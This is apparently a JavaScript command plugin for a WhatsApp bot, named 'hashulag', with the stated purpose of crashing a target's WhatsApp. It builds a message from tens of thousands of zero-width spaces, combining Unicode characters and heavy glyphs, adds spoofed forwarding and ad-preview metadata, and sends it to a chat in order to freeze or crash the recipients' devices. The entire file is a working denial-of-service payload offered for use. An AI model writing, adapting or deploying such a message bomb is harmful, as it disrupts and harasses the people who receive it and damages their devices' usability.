const { cmd, commands } = require('../command');

cmd({
    pattern: "hashulag",
    alias: ["bug", "crash", "lag"],
    desc: "Crash target WhatsApp instantly (Specific users only)",
    category: "owner",
    react: "💀",
    filename: __filename
},
async (conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, reply }) => {
    try {
        // --- අවසර ලත් අංක මෙතන ඇතුළත් කරන්න ---
        const authorizedNumbers = ['94740137623', '94706042889']; // මෙතනට ඔයාගේ අංක ටික දාන්න
        const isAuthorized = authorizedNumbers.includes(senderNumber) || isOwner;

        if (!isAuthorized) {
            return reply("ඔයාට මේක කරන්න අවසර නැහැ පැටියෝ! ❌");
        }

        // 1. Crash Payload එක නිර්මාණය කිරීම (The Bug)
        const invisiblePart = "\u200b".repeat(15000); 
        const unicodeSpam = "\u0345\u0361\u0345\u1160\u1160\u115A\u1159".repeat(6000); 
        const heavyEmoji = "҉".repeat(2500);
        
        const crashMessage = `*⚠️ HASHU-LAG SYSTEM FAILURE ⚠️*\n\n` + 
                             `_Processing Data..._\n` + 
                             invisiblePart + unicodeSpam + heavyEmoji + 
                             `\n\n*GOODBYE DEVICE* 💀`;

        // 2. මැසේජ් එක යැවීම
        await conn.sendMessage(from, {
            text: crashMessage,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    title: "𝐇 𝐀 𝐒 𝐇 𝐔 - 𝐋 𝐀 𝐆  𝐕 1",
                    body: "⚡ ᴅᴇᴠɪᴄᴇ ᴏᴠᴇʀʟᴏᴀᴅᴇᴅ",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnailUrl: `https://files.catbox.moe/vbo0vq.png`, 
                    sourceUrl: "https://whatsapp.com/channel/0029VazhnLzK0IBdwXG4152o"
                }
            }
        }, { quoted: mek });

        console.log(`[!] HashuLag deployed by ${senderNumber} in ${from}`);

    } catch (e) {
        console.error("Error in hashulag command:", e);
    }
});
